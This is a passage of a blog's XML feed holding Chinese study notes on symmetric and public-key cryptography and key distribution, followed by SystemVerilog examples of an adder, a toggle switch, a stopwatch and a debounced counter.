src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301657179.png" alt=""></p></li></ul></li></ul></li></ul></li></ul><h3 id="置换技术"><a href="#置换技术" class="headerlink" title="置换技术"></a>置换技术</h3><ul><li>置换形成新的排列.<ul><li>栅栏技术.</li><li>转轮机.</li></ul></li></ul><h3 id="破译举例"><a href="#破译举例" class="headerlink" title="破译举例"></a>破译举例</h3><ul><li>穷举法/频率分析法.</li></ul><h2 id="对称密码算法"><a href="#对称密码算法" class="headerlink" title="对称密码算法"></a>对称密码算法</h2><ul><li>加密解密的密钥相同.</li><li>使用秘密信道分配密钥.</li></ul><h3 id="S-DES-算法"><a href="#S-DES-算法" class="headerlink" title="S-DES 算法"></a>S-DES 算法</h3><ul><li><p>示例:</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301657180.png" style="zoom:50%;"></p></li></ul><h3 id="Feistel-密码结构"><a href="#Feistel-密码结构" class="headerlink" title="Feistel 密码结构"></a>Feistel 密码结构</h3><ul><li><p>流密码:</p><ul><li>每次加密数据流一位或一字节.</li><li>Vigenere 密码和 Verman 密码.</li></ul></li><li><p>分组密码:</p><ul><li>明文组整体加密, 得到等长密文组.</li><li>大多数对称密码使用分组密码.</li><li>现行的对称分组密码基于 Feistel 分组密码结构.</li></ul></li><li><p>Feistel 分组密码结构:</p><ul><li><p>使用乘积密码的概念逼近简单代换密码, 依次使用两个或以上的基本密码.</p></li><li><p>交替使用代换和置换.</p></li><li><p>是香农提出的交替使用混淆和扩散乘积密码的实际应用.</p></li><li><p>几乎所有传统分组密码结构都和 Feistel Cipher 类似.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301657181.png" style="zoom: 50%;"></p><ul><li>输入: 第 i 轮迭代输入来自上轮迭代输出.</li><li>子密钥: 由密钥 K 推导出来.</li><li>轮函数: 每轮迭代相同, 输入的子密钥不同.</li><li>代换: 数据左半部分, 轮函数 F 作用在右半部分, 与左半部分异或.</li><li>置换: 代换后交换数据左右两半.</li></ul></li><li><p>影响参数: 迭代轮数, 分组和密钥长度, 子密钥产生算法, 轮函数.</p></li></ul></li><li><p>混淆和扩散:</p><ul><li>刻画密码系统的两个基本构件, 现代分组密码设计的里程碑.</li><li>挫败基于统计方法的密码分析.</li><li>扩散: 使明文的统计特征消散在密文中, 每个明文数字影响多个密文数字.</li><li>混淆: 使密文和密钥的统计关系更复杂, 挫败推导密钥的企图</li></ul></li></ul><h3 id="DES-算法"><a href="#DES-算法" class="headerlink" title="DES 算法"></a>DES 算法</h3><ul><li><p>算法结构:</p><ul><li>密钥长度 56 bits, 加上奇偶校验写成 64 bits.</li><li>分组长度 64 bits.</li><li>迭代轮数 16 轮.</li><li>初始置换 $IP$.</li><li>末尾置换 $IP^{-1}$.</li></ul></li><li><p>除初始置换和末尾置换, DES 结构与 Feistel 结构完全相同.</p></li><li><p>子密钥生成:</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301657182.png" style="zoom:50%;"></p></li><li><p>一轮迭代:</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301657183.png" style="zoom:50%;"></p></li><li><p>解密过程: 与加密过程完全相似, 将 16 次迭代的子密钥顺序倒过来.</p></li></ul><h3 id="常用对称密码"><a href="#常用对称密码" class="headerlink" title="常用对称密码"></a>常用对称密码</h3><ul><li><p>3-DES:</p><ul><li><p>两个密钥 $K_1K_2$, 长度为 112 比特, 明文攻击代价为 $2^{112}$ 数量级.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301657184.png" style="zoom:50%;"></p></li></ul></li><li><p>Blowfish:</p><ul><li><p>算法结构:</p><ul><li>密钥长度 32-448 bits.</li><li>分组长度 64 bits.</li><li>迭代轮数 16 轮.</li><li>基本运算: 模 $2^{23}$ 加法与按位异或.</li></ul></li><li><p>F 映射包含四个 S 盒运算, 子密钥和 S 盒由算法本身生成, 数据不可辨认, 密钥分析困难.</p></li><li><p>与古典 Feistel 结构不同, 每轮运算对左右部分同时进行, 强度增强.</p></li><li><p>密钥长度可抵抗穷举攻击, 安全性未受挑战.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301657185.png" style="zoom:50%;"></p></li></ul></li><li><p>RC5:</p><ul><li><p>算法结构:</p><ul><li>密钥长度 0-2040 bits.</li><li>分组长度 32/64/128 bits.</li><li>迭代轮数不定.</li><li><p>基本运算: 模 $2^{w}$ 加法, 按位异或与循环左移.</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301657186.png" style="zoom:50%;"></p></li></ul></li></ul></li><li><p>AES:</p><ul><li><p>3DES 的缺点: 软件实现速度慢, 分组长度过小.</p></li><li><p>算法结构:</p><ul><li>密钥长度 128 bits.</li><li>分组长度 128 bits.</li><li>迭代轮数 10 轮.</li></ul></li><li><p>不是 Feistel 结构, 每一轮都使用代换和置换并行处理分组.</p></li><li><p>算法过程:</p><ul><li>字节代换: S 盒.</li><li>行移位: 置换.</li><li>列混淆: 代换.</li><li><p>轮密钥加: 按位异或.</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301657187.png" style="zoom:50%;"></p></li></ul></li></ul></li><li><p>其他对称密码算法:</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301657188.png" alt=""></p></li></ul><h2 id="非对称密码算法"><a href="#非对称密码算法" class="headerlink" title="非对称密码算法"></a>非对称密码算法</h2><h3 id="公钥密码原理"><a href="#公钥密码原理" class="headerlink" title="公钥密码原理"></a>公钥密码原理</h3><ul><li><p>对称密钥密码的缺陷:</p><ul><li>安全的信道分配密钥.</li><li>无法用于数字签名.</li><li>管理复杂, 密钥的数量 $O(n^2)$.</li></ul></li><li><p>公钥密码:</p><ul><li>密码学历史上唯一一次真正的革命.</li><li>基于数学函数而非代换和置换.</li><li>基于陷门单向函数的概念, 不知陷门信息下求逆困难.</li><li>公钥公开, 存于寄存器或文件, 加密和验证签名.</li><li>私钥保密, 解密和签名.</li><li>系统控制私钥, 通信就是安全的.</li><li>系统可以改变私钥, 公布相应的公钥代替.</li></ul></li><li><p>加密原理/签名原理.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301657189.png" alt=""></p></li><li><p>用途:</p><ul><li>加密/解密.</li><li>数字签名.</li><li><p>密钥交换: 协商会话密钥, 用于对称密钥加密.</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301657190.png" alt=""></p></li><li><p>实际应用中目前局限于数字签名和密钥管理.</p></li></ul></li><li><p>误解:</p><ul><li>密码分析角度看, 公钥密码比传统密码更安全.<ul><li>加密安全性依赖于密钥长度和破译所需计算量.</li></ul></li><li>公钥密码是通用方法, 传统密码已过时.<ul><li>公钥密码需大量计算, 仅限密钥管理和签名, 难以取代传统密码.</li></ul></li><li>传统密码与密钥分配中心的握手很麻烦, 公钥密码实现密钥分配很简单.<ul><li>公钥密码也需协议和中心代理, 处理过程不比传统密码简单有效.</li></ul></li></ul></li></ul><h3 id="RSA-算法"><a href="#RSA-算法" class="headerlink" title="RSA 算法"></a>RSA 算法</h3><ul><li><p>1978 年首次发表.</p></li><li><p>是最早满足要求、广泛接受并实现的通用公钥分组密码算法.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301707156.png" style="zoom: 50%;"></p></li><li><p>攻击方法:</p><ul><li>蛮力攻击.</li><li>数学攻击: 因子分解.</li><li>计时攻击：记录解密消息所用的时间, 来确定私钥.<ul><li>不仅可以攻击 RSA, 还可攻击其它公钥密码系统.</li><li>完全不可预知性, 仅依赖明文, 有很大的威胁.</li></ul></li></ul></li></ul><h3 id="DH-密钥交换算法"><a href="#DH-密钥交换算法" class="headerlink" title="DH 密钥交换算法"></a>DH 密钥交换算法</h3><ul><li><p>局限性: 只进行密钥交换.</p></li><li><p>有效性: 计算离散对数非常困难.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301707158.png" alt=""></p></li></ul><h3 id="DSA-算法"><a href="#DSA-算法" class="headerlink" title="DSA 算法"></a>DSA 算法</h3><ul><li>数字签名算法, 用于数字签名标准 DSS.</li><li>安全性: 计算离散对数非常困难.</li><li>局限性:<ul><li>只用于数字签名, 不能加密或密钥分配.</li><li>由 NIST 研制的, 可能有后门.</li><li>选择过程不公开, 提供的分析时间不充分.</li><li>比 RSA 慢 10－40 倍, 512 位密钥长度太小.</li></ul></li></ul><h2 id="密钥分配"><a href="#密钥分配" class="headerlink" title="密钥分配"></a>密钥分配</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><ul><li><p>加密方法:</p><ul><li>链路加密.</li><li><p>端到端加密.</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301707159.png" alt=""></p></li></ul></li><li><p>密钥分配方法:</p><ul><li>将密钥发给数据交换双方, 不让别人知道.</li></ul></li><li><p>密码系统强度与密钥分配方法有关.</p></li></ul><h3 id="三种情况"><a href="#三种情况" class="headerlink" title="三种情况"></a>三种情况</h3><h4 id="传统对称密码分配"><a href="#传统对称密码分配" class="headerlink" title="传统对称密码分配"></a>传统对称密码分配</h4><ul><li>人工传送: 适用于链路加密.</li><li>密钥分配中心: 适用于端到端加密.</li><li>密钥分配中心 KDC 模式:<ul><li>A 向 KDC 请求会话密钥, 消息有 A 和 B 的标识及临时交互号 N1.</li><li>KDC 用 Ka 加密响应, A 可知一次性会话密钥 Ks, 含 N1 原始请求消息, 还有用 Kb 加密的一次性会话密钥 Ks 和 A 的标识符 IDa.</li><li>A 存下会话密钥 Ks, 将响应后两项内容发给 B.</li></ul></li><li>网络规模很大, 密钥分配不限定在单个 KDC 上, 使用层次式 KDC.<ul><li>主密钥分配代价变小, 本地 KDC 出错或被攻击不会影响全局.</li></ul></li></ul><h4 id="公钥分配"><a href="#公钥分配" class="headerlink" title="公钥分配"></a>公钥分配</h4><ul><li>公开发布:<ul><li>通信方将公钥发送给另一通讯方或广播给各方 (电子邮件 PGP 协议).</li><li>方法简便, 但是任何人都可以伪造.</li></ul></li><li>公开可访问目录:<ul><li>可信的实体或组织维护一个动态可访问的公钥目录.</li><li>管理员定期发布或者更新该目录.</li><li>通讯方可以用新密钥替代当前密钥, 也可以从安全认证通道访问目录.</li><li>比公开公钥要安全, 但是一旦攻击者获得目录管理员私钥, 危险很大.</li></ul></li><li>公钥授权:<ul><li>A 发送时间戳消息给公钥管理员, 请求 B 的公钥. 管理员发送用其私钥 KR 加密的消息, A 用管理员公钥解密, 包含 B 的公钥、原始请求、原始时间戳.</li><li>A 保存 B 公钥, 并将 A 的表示和临时交互号 N1 发给 B. B 从管理员得到 A 的公钥. 通过核对临时交互号, 确认各自身份, 安全通信机制就建立了.</li><li>但是只要通信, 公钥管理员就成为系统瓶颈.</li></ul></li><li>公钥证书:<ul><li>不通过管理员, 用证书交换密钥, 与公钥授权安全性相同.</li><li>证书由证书管理员产生, 发给拥有相应私钥的通讯方.</li><li>通信方传递证书以传递密钥信息, 可以验证证书由证书管理员发出.</li></ul></li></ul><h4 id="利用公钥分配传统密码密钥"><a href="#利用公钥分配传统密码密钥" class="headerlink" title="利用公钥分配传统密码密钥"></a>利用公钥分配传统密码密钥</h4><ul><li><p>原因: 公钥密码速度较慢, 更适合在传统密码中实现密钥分配.</p></li><li><p>分配方法:</p><ul><li><p>简单的密钥分配方法:</p><ul><li>A 产生公/私钥对, 将 KUa 和 A 表示发给 B.</li><li>B 产生密钥 Ks, 用 A 公钥加密后传给 A.</li><li>A 计算得到密钥 Ks.</li><li>容易受到主动攻击.</li></ul></li><li><p>具有保密性和真实性的密钥分配方法:</p><ul><li><p>可以抗击主动攻击和被动攻击.</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301707160.png" alt=""></p></li></ul></li><li><p>混合方法.</p></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> Network Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Network Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成原理 笔记4</title>
      <link href="/2023/10/02/ji-suan-ji-zu-cheng-yuan-li-bi-ji-4/"/>
      <url>/2023/10/02/ji-suan-ji-zu-cheng-yuan-li-bi-ji-4/</url>
      
        <content type="html"><![CDATA[<h1 id="SystemVerilog实例"><a href="#SystemVerilog实例" class="headerlink" title="SystemVerilog实例"></a>SystemVerilog实例</h1><blockquote><p><span class="github-emoji"><span>❓</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/2753.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> A Hard Journey…</p></blockquote><h2 id="加法器"><a href="#加法器" class="headerlink" title="加法器"></a>加法器</h2><h3 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h3><p>实现一个 2 位加法器: 输入两个非负整数, 输出这两个数的和.</p><p>输入: </p><ol><li><code>a</code>: 宽度为 2, 表示输入的第一个非负整数;</li><li><code>b</code>: 宽度为 2, 表示输入的第二个非负整数.</li></ol><p>输出: </p><ol><li><code>c</code>: 宽度为 2, 表示 <code>a + b</code>, 溢出的部分舍弃.</li></ol><h3 id="电路"><a href="#电路" class="headerlink" title="电路"></a>电路</h3><p>对于这一类<strong>输出仅随着输入变化而变化</strong>的信号, 通常使用<strong>组合逻辑</strong>来实现. 特点是输出完全依赖于输入, 没有内部状态, 和时间无关. </p><p>根据真值表, 可以得到输出与输入的关系 (<code>a_0</code> 表示 <code>a</code> 的最低位). 电路图如下: </p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302013743.svg" alt=""></p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>实际上直接写 <code>a + b</code> 就可以了, EDA 工具会自动完成逻辑转换. </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">module</span> add2 <span class="token punctuation">(</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> a<span class="token punctuation">,</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> b<span class="token punctuation">,</span>  <span class="token keyword">output</span> <span class="token keyword">wire</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">assign</span> c <span class="token operator">=</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span><span class="token keyword">endmodule</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一个很容易犯的错误是在 <code>output wire [1:0] c</code> 后面多写了一个逗号. 不要把这里的 <code>assign c = a + b</code> 理解为赋值, 而是把它看成信号的连接: 通过一系列的逻辑门, 计算得到 <code>a + b</code> 的结果, 再把结果连接到输出信号 <code>c</code> 上.</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>回顾上面的电路, 最大的特点是<strong>输入一变化, 输出就跟着变</strong>, 并且与时间无关, 这种电路称为<strong>组合电路</strong> (<strong>组合逻辑电路</strong>). </p><h2 id="按钮开关"><a href="#按钮开关" class="headerlink" title="按钮开关"></a>按钮开关</h2><h3 id="需求-1"><a href="#需求-1" class="headerlink" title="需求"></a>需求</h3><p>实现一个控制台灯的按钮开关: 按下开关的时候, 灯会亮起来; 再次按下开关的时候, 灯就熄灭了. </p><p>输入: </p><ol><li><code>button</code>: 1 表示按钮被按下, 0 表示按钮处于弹起状态.</li></ol><p>输出: </p><ol><li><code>light</code>: 1 表示灯亮起, 0 表示灯熄灭.</li></ol><h3 id="电路-1"><a href="#电路-1" class="headerlink" title="电路"></a>电路</h3><p><code>light</code> 输出与它本身的历史状态有关, 并且正好是取反的关系. 如果依然采用组合逻辑来实现, 写出形如 <code>light &lt;= ~light;</code> 的代码, 对应的电路就出现了环路, 此时 <code>light</code> 会不断在 <code>0</code> 和 <code>1</code> 之间震荡.</p><p>这一类<strong>输出与历史状态相关</strong>, 并且<strong>输出在某个信号的上升沿变化</strong>的信号, 通常使用<strong>时序逻辑</strong>来实现. 把 <code>button</code> 连接到触发器的 <code>C</code> 端口, 就实现了上升沿触发的目的; 为了实现每次触发, 让输出的结果取反, 可以把触发器的 <code>Q</code> 经过一个非门再连接到触发器的 <code>D</code> 端口: </p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302013744.svg" alt=""></p><p>这个电路也成了一个环, 引入触发器的作用, 使得只有在时钟上升沿时, 触发器的输入 D 会引发输出 Q 的变化, 而当时钟上升沿结束以后, 输出 Q 也许会导致输入 D 变化, 但是输出 Q 是稳定不变的, 因此不会出现循环振荡. </p><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><p>时序逻辑里, 需要显式的声明一个寄存器 (对应电路里的触发器), 并<strong>严格</strong>把信号<strong>连接</strong>到触发器的输入 D 端口. </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">module</span> button <span class="token punctuation">(</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> button<span class="token punctuation">,</span>  <span class="token keyword">output</span> <span class="token keyword">wire</span> light<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">logic</span> light_reg<span class="token punctuation">;</span><span class="token keyword">assign</span> light <span class="token operator">=</span> light_reg<span class="token punctuation">;</span>  <span class="token important">always_ff @</span> <span class="token punctuation">(</span><span class="token keyword">posedge</span> button<span class="token punctuation">)</span> <span class="token keyword">begin</span>  light_reg <span class="token operator">&lt;=</span> <span class="token operator">~</span>light_reg<span class="token punctuation">;</span><span class="token keyword">end</span><span class="token keyword">endmodule</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>需要显式声明一个触发器, 称为 <code>light_reg</code>, 然后采用 <code>assign light = light_reg</code> 语句把触发器的输出 Q 端口连接到输出信号 <code>light</code> 上. 接下来实现 <code>light_reg</code> 在 <code>button</code> 上升沿时, 将当前的值取反.</p><p>这里把 <code>light_reg</code> 的输出 Q 经过非门连接到 <code>light_reg</code> 的输入 D 中. 换句话说, 出现在 <code>&lt;=</code> 右侧的都是触发器的输出 Q 端口, 而出现在 <code>&lt;=</code> 左侧的都是触发器的输入 D 端口. 这里的 <code>&lt;=</code> 要理解为信号的连接, 而不是软件编程中的赋值.</p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>时序逻辑电路和组合逻辑电路最大的区别在于可以<strong>记录历史, 并且在一定的条件 (输入信号 C 的上升沿) 下触发更新</strong> . 根据这个特点, 我们就可以保存状态, 在上升沿事件的“带领”下更新内部状态.</p><h2 id="秒表"><a href="#秒表" class="headerlink" title="秒表"></a>秒表</h2><h3 id="需求-2"><a href="#需求-2" class="headerlink" title="需求"></a>需求</h3><p>设计一个秒表: 输出一个数字, 每秒加一; 按下复位按钮恢复到零. </p><p>输入: </p><ol><li><code>reset</code>: 1 表示复位按钮被按下, 需要清零; 0 表示不需要清零.</li><li><code>clock</code>: 频率为 1MHz 的时钟.</li></ol><p>输出: </p><ol><li><code>timer</code>: 4 位的数字, 表示目前经过的秒数.</li></ol><p>为了实现秒表, 需要外部的时钟连接到电路的输入 <code>clock</code> 中, 可以在内部逻辑中, 每一次时钟上升沿给计数器加一, 当计数器加到 1,000,000 次就知道经过了 1s 时间. </p><h3 id="波形"><a href="#波形" class="headerlink" title="波形"></a>波形</h3><p>秒表每秒输出都会加一, 说明内部需要保存状态, 需要用<strong>时序逻辑</strong>来实现这一部分功能. 可以用一个寄存器 <code>timer_reg</code> 来保存当前的秒数, 把寄存器的输出连接到 <code>timer</code> 输出上, 只要保证每 1s 中让 <code>timer_reg</code> 加一即可. </p><p>如何实现每 1s 让 <code>timer_reg</code> 加一? 上面引入了一个频率为 1MHz 的时钟, 每 1us 都有一次时钟上升沿, 为了记忆经过了多少次上升沿又是一个状态, 用一个寄存器 <code>counter_reg</code> 来保存当前经过了多少次上升沿.</p><p>每次上升沿 <code>counter_reg</code> 加一, 当加到 1,000,000 时给 <code>timer_reg</code> 加一, 同时让 <code>counter_reg</code> 恢复到 0, 这样就实现了秒表的计时功能. </p><p>需求里面的复位按钮有两种实现方法: </p><ol><li>按下按钮, 输出变成 0, 符合输入一变输出立即跟着变的特点, 所以可以用<strong>组合逻辑</strong> 实现: <code>timer = reset ? 0 : timer_reg</code>; 在时钟上升沿, 如果发现 <code>reset == 1</code>, 设置 <code>timer_reg = 0</code> 和 <code>counter_reg = 0</code>, 松开按钮时会从 0 开始计时. </li><li>按下按钮, 在时钟上升沿如果发现 <code>reset == 1</code>, 就设置 <code>timer_reg = 0</code> 和 <code>counter_reg = 0</code>; 从下一个周期开始, 输出的 <code>timer = timer_reg</code> 就变成了 0.</li></ol><h3 id="电路-2"><a href="#电路-2" class="headerlink" title="电路"></a>电路</h3><p>两组寄存器 <code>timer_reg</code> 和 <code>counter_reg</code>. <code>counter_reg</code> 在每个 <code>clock</code> 上升沿进行更新, <code>timer_reg</code> 在每个 <code>clock</code> 的上升沿进行更新, 这些 “可能” 在电路上对应用组合逻辑实现的选择器. 最后把 <code>timer_reg</code> 的输出连接到 <code>timer</code> 输出即可.</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302013745.svg" alt=""></p><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">module</span> timer <span class="token punctuation">(</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> clock<span class="token punctuation">,</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> reset<span class="token punctuation">,</span>  <span class="token keyword">output</span> <span class="token keyword">wire</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> timer<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">logic</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> timer_reg<span class="token punctuation">;</span>  <span class="token keyword">logic</span> <span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> counter_reg<span class="token punctuation">;</span>  <span class="token comment">// sequential</span>  <span class="token important">always_ff @</span> <span class="token punctuation">(</span><span class="token keyword">posedge</span> clock<span class="token punctuation">)</span> <span class="token keyword">begin</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>reset<span class="token punctuation">)</span> <span class="token keyword">begin</span>      timer_reg <span class="token operator">&lt;=</span> <span class="token number">4'b0</span><span class="token punctuation">;</span>      counter_reg <span class="token operator">&lt;=</span> <span class="token number">20'b0</span><span class="token punctuation">;</span>    <span class="token keyword">end</span> <span class="token keyword">else</span> <span class="token keyword">begin</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>counter_reg <span class="token operator">==</span> <span class="token number">20'd999999</span><span class="token punctuation">)</span> <span class="token keyword">begin</span>        timer_reg <span class="token operator">&lt;=</span> timer_reg <span class="token operator">+</span> <span class="token number">4'b1</span><span class="token punctuation">;</span>        counter_reg <span class="token operator">&lt;=</span> <span class="token number">20'b0</span><span class="token punctuation">;</span>      <span class="token keyword">end</span> <span class="token keyword">else</span> <span class="token keyword">begin</span>        counter_reg <span class="token operator">&lt;=</span> counter_reg <span class="token operator">+</span> <span class="token number">20'b1</span><span class="token punctuation">;</span>      <span class="token keyword">end</span>    <span class="token keyword">end</span>  <span class="token keyword">end</span>  <span class="token comment">// combinatorial</span>  <span class="token keyword">assign</span> timer <span class="token operator">=</span> timer_reg<span class="token punctuation">;</span><span class="token keyword">endmodule</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来按照上面的思路来实现 <code>timer_reg</code> 和 <code>counter_reg</code> 的逻辑. 由于二者的判断是类似的, 可以直接合并起来. 上面的代码中, 语义上是<strong>当 XX 条件发生时, 向 YY 寄存器写入 ZZ</strong>, 实际电路则是 <code>ZZ &lt;= XX ? YY : ZZ</code>, 如果所有写入的条件都不满足, 则保留原来的状态.</p><h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p>经过这个例子, 我们学会了如何用 <code>if-then-else</code> 的方式更新寄存器, 而不用手动去写 <code>ZZ = XX ? YY : ZZ</code> 的代码.</p><h2 id="计数器"><a href="#计数器" class="headerlink" title="计数器"></a>计数器</h2><h3 id="需求-3"><a href="#需求-3" class="headerlink" title="需求"></a>需求</h3><p>设计一个计数器: 一个计数按钮, 每按一次计数加一; 一个复位按钮, 按下时计数恢复到零; 同时输出两位十进制的数, 显示目前按了多少次计数按钮. </p><p>输入信号: </p><ol><li><code>clock</code>: 频率为 1MHz 的时钟.</li><li><code>reset</code>: 1 表示复位按钮被按下, 0 表示没有按下.</li><li><code>button</code>: 1 表示计数按钮被按下, 0 表示没有按下.</li></ol><p>输出信号: </p><ol><li><code>ones</code>: 输出次数的个位数, 4 位.</li><li><code>tens</code>: 输出次数的十位数, 4 位.</li></ol><h3 id="波形-1"><a href="#波形-1" class="headerlink" title="波形"></a>波形</h3><p>能否在 <code>button</code> 的时钟上升沿触发, 让寄存器加一? 由于按钮的本身特性, 按下按钮的几 ms 内是不稳定的, 不断在 <code>0</code> 和 <code>1</code> 之间抖动, 最后才趋向稳定. </p><p>为了消除这个抖动的影响 (Debounce), 可以记录最近若干次 <code>button</code> 的历史值, 如果连续一段时间都处于一个固定的值, 可以认为按钮处于这个状态.</p><p>计数器是一个内部状态, 需要用寄存器来实现. 能否把去抖以后的信号作为时钟信号来驱动? 如果可能的话, 尽量减少用非时钟信号作为上边沿触发, <strong>尽量把相关的时序逻辑都放在同一个时钟域中</strong>. 如果涉及不同时钟域之间的信号处理, 之后会介绍一些用于实现跨时钟域 (CDC) 的正确电路实现方法. <strong>建议只用一个时钟, 让这个时钟驱动所有的寄存器</strong>. </p><p>可以在时钟的上升沿来检测 <code>button_debounced</code> 从 <code>0</code> 变成了 <code>1</code>, 具体思路是: </p><ol><li>设置一个寄存器 <code>button_debounced_delay</code>, 相对 <code>button_debounced</code> 有一个周期的延迟;</li><li>当 <code>button_debounced == 1</code> 且 <code>button_debounced_delay == 0</code> 时, 就检测到了一个从 <code>0</code> 变成 <code>1</code> 的过程, 对计数器加一. </li></ol><h3 id="电路-3"><a href="#电路-3" class="headerlink" title="电路"></a>电路</h3><h4 id="模块化设计"><a href="#模块化设计" class="headerlink" title="模块化设计"></a>模块化设计</h4><p>代码主要有两部分, 一部分是消抖, 一部分是计数和输出逻辑. 消抖逻辑比较独立, 可以拆出来做成一部分电路, 然后连接到计数和输出逻辑部分.</p><p>消抖模块 (Debouncer) : </p><p>输入: </p><ol><li><code>clock</code>: 频率为 1MHz 的时钟.</li><li><code>reset</code>: 1 表示复位按钮被按下, 0 表示没有按下.</li><li><code>button</code>: 1 表示计数按钮被按下, 0 表示没有按下.</li></ol><p>输出: </p><ol><li><code>button_debounced</code>: 消抖后的计数按钮信号, 高有效.</li></ol><p>计数模块 (Counter) : </p><p>输入: </p><ol><li><code>clock</code>: 频率为 1MHz 的时钟.</li><li><code>reset</code>: 1 表示复位按钮被按下, 0 表示没有按下.</li><li><code>button_debounced</code>: 消抖后的计数按钮信号, 高有效.</li></ol><p>输出: </p><ol><li><code>ones</code>: 输出次数的个位数, 4 位.</li><li><code>tens</code>: 输出次数的十位数, 4 位.</li></ol><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302013746.svg" alt=""></p><h4 id="消抖模块"><a href="#消抖模块" class="headerlink" title="消抖模块"></a>消抖模块</h4><p>需要记录下历史输入, 才可以判断是否 10,000 个周期都保持稳定. 用 10,000 个 1 位的寄存器有些浪费, 可以用一个寄存器来记录目前稳定了多少个周期. </p><ol><li>寄存器 <code>last_button_reg</code> 记录上一个周期 <code>button</code>.</li><li>寄存器 <code>counter_reg</code> 用来保存一个计数, 当 <code>button == last_button_reg</code> 时, 说明 <code>button</code> 保持稳定, 那么 <code>counter_reg = counter_reg + 1</code>; 否则清零重新计数</li><li>寄存器 <code>button_debounced_reg</code> 保存当前输出的消抖结果, 当 <code>counter_reg = 10000</code> 的时候, 更新 <code>button_debounced_reg = last_button_reg</code>. </li></ol><p>最后把 <code>button_debounced_reg</code> 连接到 <code>button_debounced</code> 输出. </p><h4 id="计数模块"><a href="#计数模块" class="headerlink" title="计数模块"></a>计数模块</h4><p>接收来自消抖模块的输出 <code>button_debounced</code>, 检测到从 <code>0</code> 变成 <code>1</code> 的时候计数器加一. 能不能用一个完整的寄存器保存计数, 输出设置 <code>ones = counter_reg % 10</code> 和 <code>tens = counter_reg / 10</code>? 不建议, 因为除法和取模运算会耗费大量的逻辑门, 并且延迟比较大. 如果位数更多, 产生的电路复杂度和延迟可能是不可接受的. 考虑到这里每次对 <code>counter_reg</code> 的操作只有加一和清零, 可以添加 